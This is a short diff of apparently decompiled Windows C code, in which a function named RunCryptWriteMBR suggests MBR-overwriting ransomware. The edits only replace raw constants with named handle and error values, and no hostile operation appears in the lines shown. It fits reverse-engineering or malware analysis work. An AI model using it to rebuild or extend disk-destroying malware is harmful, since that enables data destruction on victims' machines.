@@ -270,7 +270,7 @@ int __stdcall CreateFileSetFP(LPCSTR lpFileName, void *Dst)
 		return 0x80070057;
 	memset(Dst, 0, 0x200u);
 	v4 = CreateFileA(lpFileName, 0x80000000, 1u, 0, 3u, 0, 0);
-	if (v4 == -1)
+	if (v4 == INVALID_HANDLE_VALUE)
 	{
 		v5 = GetLastError();
 		if (v5 > 0)
@@ -435,7 +435,7 @@ int RunCryptWriteMBR()
 		{
 			if (v46)
 			{
-				result = -2147024846;
+				result = 0x80070032;
 			LABEL_48:
 				dword_6820F8F8 = result;
 				return result;
